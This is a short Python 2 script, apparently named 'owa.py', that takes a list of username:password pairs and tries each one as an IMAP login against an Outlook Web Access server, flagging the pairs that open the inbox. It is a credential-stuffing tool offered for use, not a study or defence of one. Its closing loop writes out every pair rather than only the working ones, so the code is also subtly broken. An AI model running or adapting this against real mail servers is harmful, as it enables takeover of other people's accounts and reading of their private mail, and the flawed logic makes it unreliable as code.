#!/usr/bin/env python2

import imapclient
import pyzmail
import sys


if len(sys.argv) != 4:
  sys.exit("Usage : owa.py UserPasswordList.txt OWAServerAddress outputFile")
file = str(sys.argv[1])
server = str(sys.argv[2])
out = str(sys.argv[3])

credentials = {}
users = []
good = {}
with open(file, 'r') as f:
    for line in f:
        user, pwd = line.strip().split(':')
        credentials[user] = pwd
        users.append(user)



for user in users:
    try:
        print("")
        print(user+" : "+credentials[user])
        imapObj = imapclient.IMAPClient(server, ssl=True)
        imapObj.login(user, credentials[user])
        imapObj.select_folder('INBOX', readonly=True)
        print("GOOD !!!"+user+" : "+credentials[user])
        good[user] = credentials[user]


    except imapclient.exceptions.LoginError:
        pass

print("")
print("Good Users Passwords :")
for user in users:
    print(user+" : "+credentials[user])

    with open(out, 'a') as the_file:
        the_file.write(user+" : "+credentials[user]+"\n")
